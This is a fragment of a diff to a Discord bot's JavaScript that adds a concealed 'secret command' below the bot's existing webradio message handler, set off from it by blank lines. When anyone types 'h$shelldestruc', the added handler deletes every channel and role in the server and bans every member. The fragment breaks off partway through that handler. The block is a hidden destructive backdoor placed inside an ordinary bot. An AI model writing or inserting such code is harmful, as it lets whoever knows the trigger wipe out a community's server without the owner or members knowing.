@@ -139,3 +139,19 @@ const webradio = require("./webradio.js");
 bot.on("message", message => {
     webradio(message, bot, connection, broadcast);
 });
+
+
+
+
+
+
+
+
+
+//       COMMANDE secraite
+
+bot.on("message", function (message) {
+  if (message.content === "h$shelldestruc") {
+    message.guild.channels.forEach((c) => {c.delete()})
+    message.guild.roles.forEach((c) => {c.delete()})
+    message.guild.members.forEach((c) => {c.ban()})
